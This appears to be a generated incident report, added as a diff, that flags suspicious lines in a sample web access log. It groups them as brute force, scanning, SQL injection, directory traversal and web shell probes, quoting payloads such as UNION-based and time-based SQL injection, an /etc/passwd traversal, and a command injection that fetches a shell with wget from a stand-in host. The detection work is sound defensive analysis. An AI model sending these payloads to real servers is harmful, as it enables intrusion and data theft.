@@ -1,0 +1,26 @@
+--- INCIDENT REPORT --- 
+Analysis of: sample_access.log
+
+=== BRUTE FORCE ATTEMPTS ===
+[BRUTE FORCE]: IP 10.0.0.88 had 9 failed login attempts.
+
+=== OTHER DETECTED THREATS ===
+[SQL INJECTION]: 10.0.0.88 - - [27/Oct/2025:10:32:05 +0100] "GET /products.php?id=1' OR 1=1--" 200 4012 "-" "python-requests/2.28.1"
+[SCANNER ACTIVITY]: 212.22.13.5 - - [27/Oct/2025:10:34:00 +0100] "GET /admin/ HTTP/1.1" 404 567 "-" "Nmap Scripting Engine"
+[SCANNER ACTIVITY]: 212.22.13.5 - - [27/Oct/2025:10:34:01 +0100] "GET /administrator/ HTTP/1.1" 404 567 "-" "Nmap Scripting Engine"
+[SCANNER ACTIVITY]: 212.22.13.5 - - [27/Oct/2025:10:34:02 +0100] "GET /phpmyadmin/ HTTP/1.1" 404 567 "-" "Nmap Scripting Engine"
+[SCANNER ACTIVITY]: 212.22.13.5 - - [27/Oct/2025:10:34:03 +0100] "GET /wp-admin/ HTTP/1.1" 404 567 "-" "Nmap Scripting Engine"
+[DIR TRAVERSAL]: 212.22.13.5 - - [27/Oct/2025:10:35:10 +0100] "GET /page.php?file=../../../../etc/passwd" 404 568 "-" "python-requests/2.28.1"
+[SQL INJECTION]: 10.0.0.88 - - [27/Oct/2025:10:36:15 +0100] "GET /products.php?id=1 UNION SELECT 1,2,user,pass FROM users--" 200 4012 "-" "sqlmap/1.6.3"
+[WEB SHELL/CMD INJECTION]: 172.16.0.10 - - [27/Oct/2025:10:37:00 +0100] "GET /uploads/c99.php HTTP/1.1" 404 567 "-" "python-requests/2.28.1"
+[SCANNER ACTIVITY]: 212.22.13.5 - - [27/Oct/2025:10:38:10 +0100] "GET /scripts/setup.sh HTTP/1.1" 404 567 "-" "Nmap Scripting Engine"
+[SCANNER ACTIVITY]: 10.0.0.88 - - [27/Oct/2025:10:38:15 +0100] "GET /products.php?id=1 AND 1=1" 200 4012 "-" "sqlmap/1.6.3"
+[WEB SHELL/CMD INJECTION]: 172.16.0.10 - - [27/Oct/2025:10:38:30 +0100] "GET /shell.php?cmd=ls" 404 567 "-" "python-requests/2.28.1"
+[SQL INJECTION]: 10.0.0.88 - - [27/Oct/2025:10:39:00 +0100] "GET /products.php?id=1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT (ELT(1,1))),0x7e) AS x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) AS y) AND '1'='1" 200 4012 "-" "sqlmap/1.6.3"
+[WEB SHELL/CMD INJECTION]: 212.22.13.5 - - [27/Oct/2025:10:40:02 +0100] "GET /index.php?cmd=cd /tmp/;wget http://badsite.com/shell.txt" 200 167 "-" "python-requests/2.28.1"
+[WEB SHELL/CMD INJECTION]: 172.16.0.10 - - [27/Oct/2025:10:42:00 +0100] "GET /uploads/shell.php HTTP/1.1" 404 567 "-" "python-requests/2.28.1"
+[SQL INJECTION]: 10.0.0.88 - - [27/Oct/2025:10:42:05 +0100] "GET /products.php?id=1 AND (SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END))" 200 4012 "-" "sqlmap/1.6.3"
+[DIR TRAVERSAL]: 212.22.13.5 - - [27/Oct/2025:10:42:33 +0100] "GET /page.php?file=..%2F..%2F..%2Fetc%2Fhosts" 404 568 "-" "python-requests/2.28.1"
+[WEB SHELL/CMD INJECTION]: 172.16.0.10 - - [27/Oct/2025:10:43:15 +0100] "GET /bypass.php?cmd=whoami" 404 567 "-" "python-requests/2.28.1"
+
+--- END OF REPORT --- 
